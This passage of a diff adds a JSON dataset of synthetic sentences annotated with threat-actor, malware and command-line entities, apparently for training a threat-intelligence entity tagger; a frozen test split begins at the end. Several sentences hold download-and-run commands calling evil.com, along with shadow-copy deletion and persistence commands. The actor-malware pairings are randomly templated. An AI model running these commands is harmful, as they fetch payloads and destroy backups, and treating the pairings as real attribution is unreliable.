+          "start": 104,
+          "end": 112,
+          "label": "malware",
+          "text": "DarkGate"
+        }
+      ]
+    },
+    {
+      "text": "Silent Librarian operators utilized Bumblebee to establish a backdoor, running regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 16,
+          "label": "threat-actor",
+          "text": "Silent Librarian"
+        },
+        {
+          "start": 36,
+          "end": 45,
+          "label": "malware",
+          "text": "Bumblebee"
+        },
+        {
+          "start": 79,
+          "end": 139,
+          "label": "command-line",
+          "text": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        }
+      ]
+    },
+    {
+      "text": "The SideWinder actors executed powershell.exe -ExecutionPolicy Bypass to load their custom Cobalt Strike payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 14,
+          "label": "threat-actor",
+          "text": "SideWinder"
+        },
+        {
+          "start": 31,
+          "end": 69,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        },
+        {
+          "start": 91,
+          "end": 104,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Mimikatz was injected after the execution of cmd.exe /c whoami.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 27,
+          "label": "malware",
+          "text": "Mimikatz"
+        },
+        {
+          "start": 64,
+          "end": 81,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        }
+      ]
+    },
+    {
+      "text": "APT29 launched a campaign deploying Emotet.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT29"
+        },
+        {
+          "start": 36,
+          "end": 42,
+          "label": "malware",
+          "text": "Emotet"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run which triggered a TrickBot alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 90,
+          "label": "command-line",
+          "text": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        },
+        {
+          "start": 109,
+          "end": 117,
+          "label": "malware",
+          "text": "TrickBot"
+        }
+      ]
+    },
+    {
+      "text": "Lazarus Group operators utilized Wannacry to establish a backdoor, running certutil.exe -urlcache -f http://evil.com/mal.exe on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 33,
+          "end": 41,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 75,
+          "end": 124,
+          "label": "command-line",
+          "text": "certutil.exe -urlcache -f http://evil.com/mal.exe"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear actors executed net.exe user backup /add to load their custom HermeticWiper payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 29,
+          "end": 53,
+          "label": "command-line",
+          "text": "net.exe user backup /add"
+        },
+        {
+          "start": 75,
+          "end": 88,
+          "label": "malware",
+          "text": "HermeticWiper"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed AgentTesla was injected after the execution of whoami.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 29,
+          "label": "malware",
+          "text": "AgentTesla"
+        },
+        {
+          "start": 66,
+          "end": 72,
+          "label": "command-line",
+          "text": "whoami"
+        }
+      ]
+    },
+    {
+      "text": "Sandworm launched a campaign deploying RedLine.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Sandworm"
+        },
+        {
+          "start": 39,
+          "end": 46,
+          "label": "malware",
+          "text": "RedLine"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed tasklist /v which triggered a DoublePulsar alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 39,
+          "label": "command-line",
+          "text": "tasklist /v"
+        },
+        {
+          "start": 58,
+          "end": 70,
+          "label": "malware",
+          "text": "DoublePulsar"
+        }
+      ]
+    },
+    {
+      "text": "MuddyWater operators utilized Pikabot to establish a backdoor, running taskkill /f /im explorer.exe on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "MuddyWater"
+        },
+        {
+          "start": 30,
+          "end": 37,
+          "label": "malware",
+          "text": "Pikabot"
+        },
+        {
+          "start": 71,
+          "end": 99,
+          "label": "command-line",
+          "text": "taskkill /f /im explorer.exe"
+        }
+      ]
+    },
+    {
+      "text": "The APT41 actors executed ping -n 1 10.0.0.5 to load their custom Qakbot payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "APT41"
+        },
+        {
+          "start": 26,
+          "end": 44,
+          "label": "command-line",
+          "text": "ping -n 1 10.0.0.5"
+        },
+        {
+          "start": 66,
+          "end": 72,
+          "label": "malware",
+          "text": "Qakbot"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Sliver was injected after the execution of vssadmin.exe delete shadows /all /quiet.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 25,
+          "label": "malware",
+          "text": "Sliver"
+        },
+        {
+          "start": 62,
+          "end": 101,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all /quiet"
+        }
+      ]
+    },
+    {
+      "text": "APT3 launched a campaign deploying Remcos RAT.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 4,
+          "label": "threat-actor",
+          "text": "APT3"
+        },
+        {
+          "start": 35,
+          "end": 45,
+          "label": "malware",
+          "text": "Remcos RAT"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed wscript.exe script.vbs which triggered a AsyncRAT alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 50,
+          "label": "command-line",
+          "text": "wscript.exe script.vbs"
+        },
+        {
+          "start": 69,
+          "end": 77,
+          "label": "malware",
+          "text": "AsyncRAT"
+        }
+      ]
+    },
+    {
+      "text": "Volt Typhoon operators utilized NjRAT to establish a backdoor, running cscript.exe script.js on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Volt Typhoon"
+        },
+        {
+          "start": 32,
+          "end": 37,
+          "label": "malware",
+          "text": "NjRAT"
+        },
+        {
+          "start": 71,
+          "end": 92,
+          "label": "command-line",
+          "text": "cscript.exe script.js"
+        }
+      ]
+    },
+    {
+      "text": "The Chollima actors executed mshta.exe http://evil.com/payload.hta to load their custom Lokibot payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Chollima"
+        },
+        {
+          "start": 29,
+          "end": 66,
+          "label": "command-line",
+          "text": "mshta.exe http://evil.com/payload.hta"
+        },
+        {
+          "start": 88,
+          "end": 95,
+          "label": "malware",
+          "text": "Lokibot"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed DarkGate was injected after the execution of bitsadmin.exe /transfer myjob http://evil.com/payload.exe.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 27,
+          "label": "malware",
+          "text": "DarkGate"
+        },
+        {
+          "start": 64,
+          "end": 121,
+          "label": "command-line",
+          "text": "bitsadmin.exe /transfer myjob http://evil.com/payload.exe"
+        }
+      ]
+    },
+    {
+      "text": "Mustang Panda launched a campaign deploying Bumblebee.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "threat-actor",
+          "text": "Mustang Panda"
+        },
+        {
+          "start": 44,
+          "end": 53,
+          "label": "malware",
+          "text": "Bumblebee"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed powershell.exe -ExecutionPolicy Bypass which triggered a Cobalt Strike alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 66,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        },
+        {
+          "start": 85,
+          "end": 98,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "SideWinder operators utilized Mimikatz to establish a backdoor, running cmd.exe /c whoami on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "SideWinder"
+        },
+        {
+          "start": 30,
+          "end": 38,
+          "label": "malware",
+          "text": "Mimikatz"
+        },
+        {
+          "start": 72,
+          "end": 89,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        }
+      ]
+    },
+    {
+      "text": "The Lace Tempest actors executed schtasks.exe /create /tn 'Update' /tr 'malware.exe' to load their custom Emotet payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 16,
+          "label": "threat-actor",
+          "text": "Lace Tempest"
+        },
+        {
+          "start": 33,
+          "end": 84,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Update' /tr 'malware.exe'"
+        },
+        {
+          "start": 106,
+          "end": 112,
+          "label": "malware",
+          "text": "Emotet"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed TrickBot was injected after the execution of reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 27,
+          "label": "malware",
+          "text": "TrickBot"
+        },
+        {
+          "start": 64,
+          "end": 126,
+          "label": "command-line",
+          "text": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        }
+      ]
+    },
+    {
+      "text": "APT28 launched a campaign deploying Wannacry.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed net.exe user backup /add which triggered a HermeticWiper alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 52,
+          "label": "command-line",
+          "text": "net.exe user backup /add"
+        },
+        {
+          "start": 71,
+          "end": 84,
+          "label": "malware",
+          "text": "HermeticWiper"
+        }
+      ]
+    },
+    {
+      "text": "CozyBear operators utilized AgentTesla to establish a backdoor, running whoami on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 28,
+          "end": 38,
+          "label": "malware",
+          "text": "AgentTesla"
+        },
+        {
+          "start": 72,
+          "end": 78,
+          "label": "command-line",
+          "text": "whoami"
+        }
+      ]
+    },
+    {
+      "text": "The Fancy Bear actors executed sc.exe query type= service to load their custom RedLine payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 14,
+          "label": "threat-actor",
+          "text": "Fancy Bear"
+        },
+        {
+          "start": 31,
+          "end": 57,
+          "label": "command-line",
+          "text": "sc.exe query type= service"
+        },
+        {
+          "start": 79,
+          "end": 86,
+          "label": "malware",
+          "text": "RedLine"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed DoublePulsar was injected after the execution of tasklist /v.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 31,
+          "label": "malware",
+          "text": "DoublePulsar"
+        },
+        {
+          "start": 68,
+          "end": 79,
+          "label": "command-line",
+          "text": "tasklist /v"
+        }
+      ]
+    },
+    {
+      "text": "Turla launched a campaign deploying Pikabot.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "Turla"
+        },
+        {
+          "start": 36,
+          "end": 43,
+          "label": "malware",
+          "text": "Pikabot"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed ping -n 1 10.0.0.5 which triggered a Qakbot alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 46,
+          "label": "command-line",
+          "text": "ping -n 1 10.0.0.5"
+        },
+        {
+          "start": 65,
+          "end": 71,
+          "label": "malware",
+          "text": "Qakbot"
+        }
+      ]
+    },
+    {
+      "text": "APT41 operators utilized Sliver to establish a backdoor, running vssadmin.exe delete shadows /all /quiet on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT41"
+        },
+        {
+          "start": 25,
+          "end": 31,
+          "label": "malware",
+          "text": "Sliver"
+        },
+        {
+          "start": 65,
+          "end": 104,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all /quiet"
+        }
+      ]
+    },
+    {
+      "text": "The APT35 actors executed cmd.exe /c echo 'test' to load their custom Remcos RAT payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 26,
+          "end": 48,
+          "label": "command-line",
+          "text": "cmd.exe /c echo 'test'"
+        },
+        {
+          "start": 70,
+          "end": 80,
+          "label": "malware",
+          "text": "Remcos RAT"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed AsyncRAT was injected after the execution of wscript.exe script.vbs.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 27,
+          "label": "malware",
+          "text": "AsyncRAT"
+        },
+        {
+          "start": 64,
+          "end": 86,
+          "label": "command-line",
+          "text": "wscript.exe script.vbs"
+        }
+      ]
+    },
+    {
+      "text": "Kimsuky launched a campaign deploying NjRAT.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "threat-actor",
+          "text": "Kimsuky"
+        },
+        {
+          "start": 38,
+          "end": 43,
+          "label": "malware",
+          "text": "NjRAT"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed mshta.exe http://evil.com/payload.hta which triggered a Lokibot alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 65,
+          "label": "command-line",
+          "text": "mshta.exe http://evil.com/payload.hta"
+        },
+        {
+          "start": 84,
+          "end": 91,
+          "label": "malware",
+          "text": "Lokibot"
+        }
+      ]
+    },
+    {
+      "text": "Chollima operators utilized DarkGate to establish a backdoor, running bitsadmin.exe /transfer myjob http://evil.com/payload.exe on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Chollima"
+        },
+        {
+          "start": 28,
+          "end": 36,
+          "label": "malware",
+          "text": "DarkGate"
+        },
+        {
+          "start": 70,
+          "end": 127,
+          "label": "command-line",
+          "text": "bitsadmin.exe /transfer myjob http://evil.com/payload.exe"
+        }
+      ]
+    },
+    {
+      "text": "The Hafnium actors executed regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll to load their custom Bumblebee payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 11,
+          "label": "threat-actor",
+          "text": "Hafnium"
+        },
+        {
+          "start": 28,
+          "end": 88,
+          "label": "command-line",
+          "text": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        },
+        {
+          "start": 110,
+          "end": 119,
+          "label": "malware",
+          "text": "Bumblebee"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Cobalt Strike was injected after the execution of powershell.exe -ExecutionPolicy Bypass.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 32,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        },
+        {
+          "start": 69,
+          "end": 107,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        }
+      ]
+    },
+    {
+      "text": "Silent Librarian launched a campaign deploying Mimikatz.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 16,
+          "label": "threat-actor",
+          "text": "Silent Librarian"
+        },
+        {
+          "start": 47,
+          "end": 55,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed schtasks.exe /create /tn 'Update' /tr 'malware.exe' which triggered a Emotet alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 79,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Update' /tr 'malware.exe'"
+        },
+        {
+          "start": 98,
+          "end": 104,
+          "label": "malware",
+          "text": "Emotet"
+        }
+      ]
+    },
+    {
+      "text": "Lace Tempest operators utilized TrickBot to establish a backdoor, running reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Lace Tempest"
+        },
+        {
+          "start": 32,
+          "end": 40,
+          "label": "malware",
+          "text": "TrickBot"
+        },
+        {
+          "start": 74,
+          "end": 136,
+          "label": "command-line",
+          "text": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        }
+      ]
+    },
+    {
+      "text": "The APT29 actors executed certutil.exe -urlcache -f http://evil.com/mal.exe to load their custom Wannacry payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "APT29"
+        },
+        {
+          "start": 26,
+          "end": 75,
+          "label": "command-line",
+          "text": "certutil.exe -urlcache -f http://evil.com/mal.exe"
+        },
+        {
+          "start": 97,
+          "end": 105,
+          "label": "malware",
+          "text": "Wannacry"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed HermeticWiper was injected after the execution of net.exe user backup /add.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 32,
+          "label": "malware",
+          "text": "HermeticWiper"
+        },
+        {
+          "start": 69,
+          "end": 93,
+          "label": "command-line",
+          "text": "net.exe user backup /add"
+        }
+      ]
+    },
+    {
+      "text": "Lazarus Group launched a campaign deploying AgentTesla.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 44,
+          "end": 54,
+          "label": "malware",
+          "text": "AgentTesla"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed sc.exe query type= service which triggered a RedLine alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 54,
+          "label": "command-line",
+          "text": "sc.exe query type= service"
+        },
+        {
+          "start": 73,
+          "end": 80,
+          "label": "malware",
+          "text": "RedLine"
+        }
+      ]
+    },
+    {
+      "text": "Fancy Bear operators utilized DoublePulsar to establish a backdoor, running tasklist /v on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "Fancy Bear"
+        },
+        {
+          "start": 30,
+          "end": 42,
+          "label": "malware",
+          "text": "DoublePulsar"
+        },
+        {
+          "start": 76,
+          "end": 87,
+          "label": "command-line",
+          "text": "tasklist /v"
+        }
+      ]
+    },
+    {
+      "text": "The Sandworm actors executed taskkill /f /im explorer.exe to load their custom Pikabot payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Sandworm"
+        },
+        {
+          "start": 29,
+          "end": 57,
+          "label": "command-line",
+          "text": "taskkill /f /im explorer.exe"
+        },
+        {
+          "start": 79,
+          "end": 86,
+          "label": "malware",
+          "text": "Pikabot"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Qakbot was injected after the execution of ping -n 1 10.0.0.5.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 25,
+          "label": "malware",
+          "text": "Qakbot"
+        },
+        {
+          "start": 62,
+          "end": 80,
+          "label": "command-line",
+          "text": "ping -n 1 10.0.0.5"
+        }
+      ]
+    },
+    {
+      "text": "MuddyWater launched a campaign deploying Sliver.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "MuddyWater"
+        },
+        {
+          "start": 41,
+          "end": 47,
+          "label": "malware",
+          "text": "Sliver"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed cmd.exe /c echo 'test' which triggered a Remcos RAT alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 50,
+          "label": "command-line",
+          "text": "cmd.exe /c echo 'test'"
+        },
+        {
+          "start": 69,
+          "end": 79,
+          "label": "malware",
+          "text": "Remcos RAT"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators utilized AsyncRAT to establish a backdoor, running wscript.exe script.vbs on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 33,
+          "label": "malware",
+          "text": "AsyncRAT"
+        },
+        {
+          "start": 67,
+          "end": 89,
+          "label": "command-line",
+          "text": "wscript.exe script.vbs"
+        }
+      ]
+    },
+    {
+      "text": "The APT3 actors executed cscript.exe script.js to load their custom NjRAT payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "APT3"
+        },
+        {
+          "start": 25,
+          "end": 46,
+          "label": "command-line",
+          "text": "cscript.exe script.js"
+        },
+        {
+          "start": 68,
+          "end": 73,
+          "label": "malware",
+          "text": "NjRAT"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Lokibot was injected after the execution of mshta.exe http://evil.com/payload.hta.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 26,
+          "label": "malware",
+          "text": "Lokibot"
+        },
+        {
+          "start": 63,
+          "end": 100,
+          "label": "command-line",
+          "text": "mshta.exe http://evil.com/payload.hta"
+        }
+      ]
+    },
+    {
+      "text": "Volt Typhoon launched a campaign deploying DarkGate.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Volt Typhoon"
+        },
+        {
+          "start": 43,
+          "end": 51,
+          "label": "malware",
+          "text": "DarkGate"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll which triggered a Bumblebee alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 88,
+          "label": "command-line",
+          "text": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        },
+        {
+          "start": 107,
+          "end": 116,
+          "label": "malware",
+          "text": "Bumblebee"
+        }
+      ]
+    },
+    {
+      "text": "Hafnium operators utilized Cobalt Strike to establish a backdoor, running powershell.exe -ExecutionPolicy Bypass on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "threat-actor",
+          "text": "Hafnium"
+        },
+        {
+          "start": 27,
+          "end": 40,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        },
+        {
+          "start": 74,
+          "end": 112,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        }
+      ]
+    },
+    {
+      "text": "The Mustang Panda actors executed cmd.exe /c whoami to load their custom Mimikatz payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Mustang Panda"
+        },
+        {
+          "start": 34,
+          "end": 51,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 73,
+          "end": 81,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Emotet was injected after the execution of schtasks.exe /create /tn 'Update' /tr 'malware.exe'.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 25,
+          "label": "malware",
+          "text": "Emotet"
+        },
+        {
+          "start": 62,
+          "end": 113,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Update' /tr 'malware.exe'"
+        }
+      ]
+    },
+    {
+      "text": "SideWinder launched a campaign deploying TrickBot.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "SideWinder"
+        },
+        {
+          "start": 41,
+          "end": 49,
+          "label": "malware",
+          "text": "TrickBot"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed certutil.exe -urlcache -f http://evil.com/mal.exe which triggered a Wannacry alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 77,
+          "label": "command-line",
+          "text": "certutil.exe -urlcache -f http://evil.com/mal.exe"
+        },
+        {
+          "start": 96,
+          "end": 104,
+          "label": "malware",
+          "text": "Wannacry"
+        }
+      ]
+    },
+    {
+      "text": "APT29 operators utilized HermeticWiper to establish a backdoor, running net.exe user backup /add on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT29"
+        },
+        {
+          "start": 25,
+          "end": 38,
+          "label": "malware",
+          "text": "HermeticWiper"
+        },
+        {
+          "start": 72,
+          "end": 96,
+          "label": "command-line",
+          "text": "net.exe user backup /add"
+        }
+      ]
+    },
+    {
+      "text": "The APT28 actors executed whoami to load their custom AgentTesla payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 26,
+          "end": 32,
+          "label": "command-line",
+          "text": "whoami"
+        },
+        {
+          "start": 54,
+          "end": 64,
+          "label": "malware",
+          "text": "AgentTesla"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed RedLine was injected after the execution of sc.exe query type= service.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 26,
+          "label": "malware",
+          "text": "RedLine"
+        },
+        {
+          "start": 63,
+          "end": 89,
+          "label": "command-line",
+          "text": "sc.exe query type= service"
+        }
+      ]
+    },
+    {
+      "text": "CozyBear launched a campaign deploying DoublePulsar.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 39,
+          "end": 51,
+          "label": "malware",
+          "text": "DoublePulsar"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed taskkill /f /im explorer.exe which triggered a Pikabot alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 56,
+          "label": "command-line",
+          "text": "taskkill /f /im explorer.exe"
+        },
+        {
+          "start": 75,
+          "end": 82,
+          "label": "malware",
+          "text": "Pikabot"
+        }
+      ]
+    },
+    {
+      "text": "Sandworm operators utilized Qakbot to establish a backdoor, running ping -n 1 10.0.0.5 on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Sandworm"
+        },
+        {
+          "start": 28,
+          "end": 34,
+          "label": "malware",
+          "text": "Qakbot"
+        },
+        {
+          "start": 68,
+          "end": 86,
+          "label": "command-line",
+          "text": "ping -n 1 10.0.0.5"
+        }
+      ]
+    },
+    {
+      "text": "The Turla actors executed vssadmin.exe delete shadows /all /quiet to load their custom Sliver payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "Turla"
+        },
+        {
+          "start": 26,
+          "end": 65,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+          "start": 87,
+          "end": 93,
+          "label": "malware",
+          "text": "Sliver"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Remcos RAT was injected after the execution of cmd.exe /c echo 'test'.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 29,
+          "label": "malware",
+          "text": "Remcos RAT"
+        },
+        {
+          "start": 66,
+          "end": 88,
+          "label": "command-line",
+          "text": "cmd.exe /c echo 'test'"
+        }
+      ]
+    },
+    {
+      "text": "APT41 launched a campaign deploying AsyncRAT.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT41"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "AsyncRAT"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed cscript.exe script.js which triggered a NjRAT alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 49,
+          "label": "command-line",
+          "text": "cscript.exe script.js"
+        },
+        {
+          "start": 68,
+          "end": 73,
+          "label": "malware",
+          "text": "NjRAT"
+        }
+      ]
+    },
+    {
+      "text": "APT3 operators utilized Lokibot to establish a backdoor, running mshta.exe http://evil.com/payload.hta on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 4,
+          "label": "threat-actor",
+          "text": "APT3"
+        },
+        {
+          "start": 24,
+          "end": 31,
+          "label": "malware",
+          "text": "Lokibot"
+        },
+        {
+          "start": 65,
+          "end": 102,
+          "label": "command-line",
+          "text": "mshta.exe http://evil.com/payload.hta"
+        }
+      ]
+    },
+    {
+      "text": "The Kimsuky actors executed bitsadmin.exe /transfer myjob http://evil.com/payload.exe to load their custom DarkGate payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 11,
+          "label": "threat-actor",
+          "text": "Kimsuky"
+        },
+        {
+          "start": 28,
+          "end": 85,
+          "label": "command-line",
+          "text": "bitsadmin.exe /transfer myjob http://evil.com/payload.exe"
+        },
+        {
+          "start": 107,
+          "end": 115,
+          "label": "malware",
+          "text": "DarkGate"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Bumblebee was injected after the execution of regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 28,
+          "label": "malware",
+          "text": "Bumblebee"
+        },
+        {
+          "start": 65,
+          "end": 125,
+          "label": "command-line",
+          "text": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        }
+      ]
+    },
+    {
+      "text": "Chollima launched a campaign deploying Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Chollima"
+        },
+        {
+          "start": 39,
+          "end": 52,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed cmd.exe /c whoami which triggered a Mimikatz alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 45,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 64,
+          "end": 72,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    }
+  ],
+  "frozen_test": [
+    {
+      "text": "APT41 deployed Mimikatz to dump memory and harvested credentials.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT41"
+        },
